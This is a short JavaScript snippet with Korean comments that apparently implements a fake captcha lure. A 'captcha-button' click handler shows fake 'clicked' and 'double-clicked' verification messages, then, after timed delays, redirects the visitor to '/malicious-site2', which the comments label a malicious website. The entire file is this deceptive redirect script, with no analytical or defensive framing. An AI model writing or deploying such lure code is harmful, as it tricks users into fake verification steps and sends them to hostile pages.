document.getElementById("captcha-button").addEventListener("click", function(event) {
    const button = document.getElementById("captcha-button");

    // 첫 번째 클릭 시 스타일 변경
    button.classList.add("clicked");
    button.innerText = "클릭됨! (더블 클릭 처리 중...)";

    // 300ms 후에 두 번째 클릭처럼 동작
    setTimeout(() => {
        button.classList.remove("clicked");
        button.classList.add("double-clicked");
        button.innerText = "더블 클릭됨! 이동 중...";

        // 500ms 후에 악성 웹사이트로 리디렉션
        setTimeout(() => {
            window.location.href = "/malicious-site2"; // 악성 웹사이트로 리디렉션
        }, 500);
    }, 300);
});